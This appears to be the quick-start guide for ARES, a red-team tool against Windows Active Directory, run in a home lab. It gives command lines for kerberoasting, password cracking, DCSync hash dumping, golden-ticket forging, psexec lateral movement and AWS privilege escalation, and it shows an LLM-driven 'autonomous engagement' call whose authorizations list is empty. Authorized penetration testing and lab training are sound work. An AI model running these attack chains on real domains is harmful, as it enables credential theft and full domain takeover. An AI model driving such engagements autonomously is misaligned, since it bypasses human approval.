# ARES — First Engagement in 30 Minutes

> Written authorization required before testing any system.

---

## Before you start

You need three things:

1. **Python 3.10+** on your attacker machine
2. **A Windows domain** to test against — even a home lab works
3. **Domain credentials** — a regular user account is enough to start

No lab? → [Set one up in 20 minutes](#lab-setup) with GOAD.

---

## Step 1 — Install (3 min)

```bash
pip install ares-redteam[ad]
ares-setup                      # creates .env · generates random secrets
ares doctor                     # verify everything is ready
```

What `ares doctor` should show:
```
✅  Python 3.11.x
✅  impacket 0.12.x   (AD/SMB modules)
✅  ldap3 2.9.x       (LDAP enumeration ready)
✅  .env configured
```

If anything is red, it prints the exact command to fix it.

For a full install with all optional integrations:

```bash
pip install ares-redteam[full]
```

`[all]` remains available as a compatibility alias.

---

## Step 2 — Create a campaign (1 min)

```bash
ares campaign create \
  --name "First Lab Test" \
  --client "Homelab" \
  --scope "192.168.56.0/24" \
  --noise normal

# Save the campaign ID
export C=$(ares campaign list --json | jq -r '.[0].id')
echo "Campaign: $C"
```

The scope is a hard stop — ARES will refuse to run modules against IPs outside it.

### Dashboard login flow

```bash
ares-api
```

Open `http://localhost:8080/dashboard`, sign in with the configured admin
account, create a campaign, choose a module, keep `dry_run` enabled, and submit.
The dashboard sends `POST /auth/token` as OAuth2 form data and calls only the
main API routes documented in `docs/api-reference.md`.

---

## Step 3 — Enumerate (5 min, read-only)

These modules only read from LDAP. No exploits, no alerts.

```bash
DC="192.168.56.10"
DOMAIN="corp.local"
CREDS="--dc $DC --domain $DOMAIN --username jdoe --password Password123"

ares module run ad.enum_users     $CREDS   # who's in the domain?
ares module run ad.enum_spn       $CREDS   # which accounts are kerberoastable?
ares module run ad.enum_computers $CREDS   # what machines exist?
ares module run recon.fingerprint --target $DC   # what EDR is running?
```

Check what was found:
```bash
ares findings list --campaign-id $C
```

---

## Step 4 — Harvest credentials (5 min)

```bash
# Request TGS tickets for all SPN accounts — save to vault
ares module run ad.kerberoast $CREDS

# If any accounts don't require pre-auth (common misconfiguration)
ares module run ad.asreproast --dc $DC --domain $DOMAIN \
  --userfile /tmp/users.txt    # no creds needed for this one

# Crack offline — uses hashcat if available, john as fallback
ares module run credential.crack

# See what got cracked
ares vault list
```

---

## Step 5 — Escalate (if you have DA creds)

```bash
# This requires team_lead authorization — protects against accidents
ares module run ad.dcsync $CREDS
# → dumps all NTLM hashes including krbtgt

# Forge a golden ticket for persistent access
ares module run credential.golden_ticket \
  --domain $DOMAIN \
  --domain-sid S-1-5-21-... \
  --krbtgt-hash <hash from dcsync>
```

---

## Step 6 — Generate the report (1 min)

```bash
ares report generate \
  --campaign-id $C \
  --format html \
  --output lab_report.html

open lab_report.html     # macOS
xdg-open lab_report.html # Linux
```

The report includes:
- MITRE ATT&CK heatmap of every technique used
- Timeline of all actions with timestamps
- Findings ranked by severity with evidence
- Remediation steps per finding

---

## What's next

Once you're comfortable with the basics, try:

**Lateral movement:**
```bash
ares module run lateral.psexec \
  --target 192.168.56.20 \
  --username Administrator \
  --password "CrackedPassword"
```

**Cloud attack paths (AWS):**
```bash
pip install ares-redteam[cloud]
ares module run cloud.aws --access-key AKIA... --secret-key ...
ares module run cloud.aws_privesc --access-key AKIA...
```

**AI autonomous planning** — let ARES plan the whole engagement:
```bash
# Start the API server first
ares server start

# Then trigger autonomous engagement
curl -X POST http://localhost:8080/strategy/engage \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "campaign_id": "'$C'",
    "goal": "domain_admin",
    "max_rounds": 3,
    "llm_backend": "claude",
    "authorizations": []
  }'
```

ARES will enumerate, select techniques, execute, check detection probability,
and stop itself if anything looks too hot.

---

## Common issues

| Error | Fix |
|-------|-----|
| `No module named 'impacket'` | `pip install ares-redteam[ad]` |
| `Connection refused :389` | Check DC IP — ARES needs ports 88, 389, 445 reachable |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | Username wrong — verify with `ares module run ad.enum_users` |
| `STATUS_LOGON_FAILURE` | Wrong password |
| `Scope violation: target not in scope` | Update `--scope` when creating campaign |
| `ARES_SECRET_KEY not set` | Run `ares-setup` or `cp .env.example .env` |
| `impacket version too old` | `pip install --upgrade impacket` |

---

## Lab setup

Don't have a Windows domain? Two options:

**Option A — GOAD (recommended, 20 min)**

[Game of Active Directory](https://github.com/Orange-Cyberdefense/GOAD) sets up
a full 3-DC lab with pre-configured misconfigurations designed for testing.

```bash
git clone https://github.com/Orange-Cyberdefense/GOAD
cd GOAD
vagrant up    # needs VirtualBox + Vagrant
# → 3 DCs on 192.168.56.0/24, many vulns ready to test
```

**Option B — Windows Server Eval (free, 180 days)**

1. Download [Windows Server 2022 Evaluation](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022) (free, no account needed)
2. Install in VirtualBox/VMware, promote to Domain Controller
3. Create a regular user account
4. Set scope to your VM's IP range in ARES

→ You now have a target for all AD modules.

---

*ARES is for authorized red team engagements only.*
*Get written permission before testing any real system.*
